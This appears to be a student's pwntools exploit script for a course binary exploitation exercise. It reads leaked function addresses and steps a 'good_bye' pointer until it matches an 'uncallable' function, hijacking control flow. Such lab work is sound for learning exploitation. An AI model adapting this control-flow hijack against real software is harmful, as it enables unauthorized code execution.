#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = 'handout/exercise6/exercise6a'
#exe = './exercise6a'
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

r = start()

r.recvuntil(b'good_bye')
goodbye = r.recvline().strip()
r.recvuntil(b'uncallable')
uncallable = r.recvline().strip()
r.recvuntil(b'enter:\n')
r.sendline(b'A')

goodbye_change = 0
init = goodbye
while goodbye != uncallable:
    if not goodbye_change:
        r.recvuntil(b'good_bye')
        goodbye = r.recvline().strip()
        r.recvuntil(b'uncallable')
        uncallable = r.recvline().strip()
        r.recvuntil(b'enter:\n')
        r.sendline(b'A')

    else:
        r.recvuntil(b'good_bye')
        goodbye = r.recvline().strip()
        r.recvuntil(b'uncallable')
        uncallable = r.recvline().strip()
        r.recvuntil(b'enter:\n')  
        if int.from_bytes(goodbye, 'little') < int.from_bytes(uncallable, 'little'):
            r.sendline(b'd')
        else:
            r.sendline(b'a')

    if init != goodbye:
        goodbye_change = 1

r.sendline(b'q')
print(r.recvall())